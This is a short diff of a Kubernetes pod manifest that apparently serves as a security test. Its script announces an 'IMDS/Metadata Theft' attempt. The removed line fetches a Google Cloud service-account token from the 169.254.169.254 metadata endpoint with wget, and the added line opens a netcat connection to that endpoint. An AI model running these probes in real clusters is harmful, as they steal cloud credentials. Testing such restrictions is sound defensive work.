@@ -22,7 +22,7 @@ spec:
       - -c
       - |
         echo "[+] Attempting IMDS/Metadata Theft..."
-        wget -q -O- --timeout=2 --header="Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token || true
+        nc 169.254.169.254 80
         sleep 5
     securityContext:
       allowPrivilegeEscalation: false
